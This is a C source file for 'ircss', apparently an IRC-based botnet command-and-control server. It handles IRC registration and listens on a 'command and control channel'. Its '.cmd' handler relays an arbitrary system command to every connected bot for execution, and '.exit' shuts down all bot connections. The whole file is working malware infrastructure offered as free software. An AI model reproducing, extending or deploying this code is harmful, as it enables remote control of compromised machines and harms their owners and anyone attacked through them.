/*
 * Copyright (c) 2010 John Gordon <jgor@indiecom.org>
 *   and Doug Farre <dougfarre@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <search.h>
#include <pthread.h>
#include "core.h"
#include "sock.h"
#include "irc.h"

// counter for number of irc users that have connected
int user_fd = 0;

/*
 * Registers newly-connected users via NICK and USER commands as specified in
 * RFC 1459.
 */
void reg_conn(int cli_sockfd, user_t *user) {
    debug("reg_conn() entered.\n");
    char buf[MAX_BUF + 1], *line, *tok;
    int err, i;

    /* loop until user has successfully registered */
    while (!(user->reg)) {
        /* read next message from the user */
        memset(&buf, 0, sizeof(buf));
        err = read(cli_sockfd, buf, MAX_BUF);
        if (err == -1) error("read failed");

        /* get the first word (up to first space or comma) */
        tok = strtok(buf, " ,");

        while (tok != NULL) {
            /* irc NICK declaration */
            if (strcmp(tok, "NICK") == 0) {
                /* get the rest of the line, store as user's nick */
                tok = strtok(NULL, "\n");
                strncpy(user->nick, tok, MAX_NICK);

                /* get rid of trailing line return */
                if (user->nick[strlen(user->nick) - 1] == '\r')
                    user->nick[strlen(user->nick) - 1] = '\0';

                debug("user->nick = %s\n", user->nick);
            }

            /* irc USER declaration */
            else if (strcmp(tok, "USER") == 0) {
                tok = strtok(NULL, " ,");
                /* get next word in the line, store as user's username */
                strncpy(user->user, tok, MAX_USER);
                debug("user->user = %s\n", user->user);
                /* skip next word, unused */
                tok = strtok(NULL, " ,");
                /* skip next word, unused */
                tok = strtok(NULL, " ,");
                /* get rest of line, store as user's real name */
                tok = strtok(NULL, "\n");
                /* ignore leading colon */
                if (tok[0] == ':') tok++;
                strncpy(user->real, tok, MAX_REAL);

                /* get rid of trailing line return */
                if (user->real[strlen(user->real) - 1] == '\r')
                    user->real[strlen(user->real) - 1] = '\0';

                debug("user->real = %s\n", user->real);
            }

            /* get the next word in the message */
            tok = strtok(NULL, " ,");
        }

        /* need nickname, username and real name for successful registration */
        if (strlen(user->nick) && strlen(user->user) && strlen(user->real))
            user->reg = 1;
    }

    debug("registration successful.\n");

    /* ircd preamble, displayed to user's client upon successful registration */
    char preamble[6][MAX_BUF + 1];
    /* MOTD */
    snprintf(preamble[0], MAX_BUF, ":%s %d %s :- %s Message of the Day -\n", SERVER, RPL_MOTDSTART, user->nick, SERVER);
    snprintf(preamble[1], MAX_BUF, ":%s %d %s :- Welcome to ircss. Enjoy!\n", SERVER, RPL_MOTD, user->nick);
    snprintf(preamble[2], MAX_BUF, ":%s %d %s :End of /MOTD command.\n", SERVER, RPL_ENDOFMOTD, user->nick);
    /* have user automatically join a certain channel */
    snprintf(preamble[3], MAX_BUF, ":%s!~%s@%s JOIN :%s\n", user->nick, user->user, user->host, CHANNEL);
    /* set channel topic */
    snprintf(preamble[4], MAX_BUF, ":%s %d %s %s :%s\n", SERVER, RPL_TOPIC, user->nick, CHANNEL, TOPIC);
    /* list of users in the channel */
    snprintf(preamble[5], MAX_BUF, ":%s %d %s = %s :%s %s\n", SERVER, RPL_NAMREPLY, user->nick, CHANNEL, BOT_NICK, user->nick);

    /* send preamble to user's irc client */
    for (i = 0; i < sizeof(preamble) / MAX_BUF; i++) {
        err = write(cli_sockfd, preamble[i], strlen(preamble[i]));
        if (err == -1) error("write failed");
    }
}

/*
 * Parses messages from an irc user.
 */
void cli_read(int cli_sockfd) {
    int err, i;
    char buf[MAX_BUF], cmd[MAX_BUF], msg[MAX_BUF], *tok;

    /* listen indefinitely for incoming messages */
    while (1) {
        /* attempt to read the next incoming message */
        memset(&buf, 0, sizeof(buf));
        err = read(cli_sockfd, buf, MAX_BUF);
        if (err == -1) error("read failed");
        /* user has disconnected */
        else if (err == 0) break;

        /* get the first word of the message */
        tok = strtok(buf, " ");

        /* PRIVMSG, a message to a channel or user */
        if (strcmp(tok, "PRIVMSG") == 0) {
            debug("got PRIVMSG\n");
            tok = strtok(NULL, " ");
            /* if destined for the command and control channel */
            if (strcmp(tok, CHANNEL) == 0) {
                debug("got %s\n", CHANNEL);
                tok = strtok(NULL, " ");
                /* ignore leading colon */
                if (tok[0] == ':') tok++;
                /* if message starts with a . parse as a bot command */
                if (tok[0] == '.') {
                    debug("got .\n");
                    tok++;
                    /* read in the bot command */
                    sscanf(tok, "%s", &cmd);
                    debug("cmd = %s\n", cmd);

                    /* exit, kill the server */
                    if (strcmp(cmd, "exit") == 0) {
                        close(cli_sockfd);
                        debug("exited.\n");
                        exit(EXIT_SUCCESS);
                    }

                    /* help, display supported commands */
                    else if (strcmp(cmd, "help") == 0) {
                        
                        cli_write(cli_sockfd, ".help - display supported commands\n");
                        cli_write(cli_sockfd, ".cmd [CMD] - execute CMD on all bots\n");
                        cli_write(cli_sockfd, ".exit - kill ircss daemon and all bot connections\n");
                    }

                    /* cmd, a system command to be executed on all bots */
                    else if (strcmp(cmd, "cmd") == 0) {
                        tok = strtok(NULL, "\r\n");
                        /* string to send to bots: CMD some system command */
                        snprintf(msg, MAX_BUF, "CMD %s\n", tok);

                        /* iterate through all connected bots */
                        for (i = 1; i <= bot_fd; i++) {
                            char search[MAX_BUF];
                            ENTRY search_item;
                            ENTRY *result_item;

                            /* key for connection hashtable, format is 'botN' */
                            snprintf(search, MAX_BUF, "bot%d", i);

                            search_item.key = search;

                            debug("searching for %s\n", search_item.key);

                            /* search the connection hashtable for the i'th bot,
                               return bot_t struct for the bot w/ socket */
                            result_item = hsearch(search_item, FIND);

                            /* send CMD to the i'th bot to be executed */
                            if (result_item != NULL)
                                ss_write(((bot_t *)result_item->data)->sockfd, msg);
                            else debug("socket not found.\n");
                        }

                    }
                    
                    /* not a recognized bot command */
                    else {
                        debug("unknown command: %s\n", cmd);  
                        continue;
                    }
                }
                /* echo all non-commands back to the user */
                else cli_write(cli_sockfd, tok);
            }
        }
    }
}

/*
 * Sends a message to an irc user.
 */
void cli_write(int cli_sockfd, char *msg) {
    int err;
    char buf[MAX_BUF];

    debug("cli_write() entered, cli_sockfd = %d\n", cli_sockfd);
    debug("msg = %s\n", msg);

    /* construct a PRIVMSG to the user from the ircss bot over irc */
    snprintf(buf, MAX_BUF, ":%s!~%s@%s PRIVMSG %s :%s", BOT_NICK, BOT_USER, BOT_HOST, CHANNEL, msg);

    err = write(cli_sockfd, buf, strlen(buf));
    if (err == -1) error("write failed");
}

/*
 * Starts a thread to listen for user input on given sockfd.
 */
void *run_irc_cli(void *ptr) {
    int *cli_sockfd_ptr = (int *) ptr;
    int cli_sockfd = *cli_sockfd_ptr;
    user_t user;
    char s[INET6_ADDRSTRLEN];
    char host[MAX_HOST + 1];
    struct sockaddr_storage cli_addr;
    int cli_len = sizeof(cli_addr);

    /* initialize user struct */
    user.reg = 0;
    user.nick = calloc(MAX_NICK, sizeof(char));
    user.user = calloc(MAX_USER, sizeof(char));
    user.real = calloc(MAX_REAL, sizeof(char));
    user.host = calloc(MAX_HOST, sizeof(char));

    /* look up address of remote user, store as user's host */
    getpeername(cli_sockfd, (struct sockaddr *) &cli_addr, &cli_len);
    inet_ntop(cli_addr.ss_family, get_in_addr((struct sockaddr *)&cli_addr), s, sizeof(s));
    getnameinfo((struct sockaddr *)&cli_addr, sizeof(cli_addr), host, sizeof(host), NULL, 0, 0);
    strncpy(user.host, host, MAX_HOST);
    debug("user.host = %s\n", user.host);

    /* begin irc registration (NICK/USER declaration) */
    reg_conn(cli_sockfd, &user);

    /* listen for input from user */
    cli_read(cli_sockfd);
}

/*
 * Starts a listening irc server on the given port.
 */
void *run_irc_srv(void *ptr) {
    int *port_ptr = (int *) ptr;
    int port = *port_ptr;
    int srv_sockfd, cli_sockfd;
    pthread_t pt_read;

    /* start a listening server on given port */
    /* socket is hard-coded to AF_INET (ipv4) until an elegant solution can be
       implemented to support ipv4/ipv6 simultaneously on OpenBSD */
    srv_sockfd = get_srv_sock(port, AF_INET);

    /* listen indefinitely for new users to connect */
    while (1) {
        /* listen for and accept a new connection from a user */
        cli_sockfd = get_cli_sock(srv_sockfd);
        user_fd++;

        char key[MAX_BUF];
        user_t data;
        ENTRY item;

        /* construct connection hashtable key for this user, userN */
        snprintf(key, MAX_BUF, "user%d", user_fd);

        /* construct connection hashtable value, a user_t containing the sock */
        data.sockfd = cli_sockfd;

        item.key = key;
        item.data = &data;

        debug("entering %s -> sockfd=%d\n", item.key, ((user_t *)item.data)->sockfd);

        /* enter the user's key/value into the connection hashtable */
        hsearch(item, ENTER);

        /* start a thread to interact with the user */
        pthread_create(&pt_read, NULL, run_irc_cli, (void *) &cli_sockfd);
    }
}

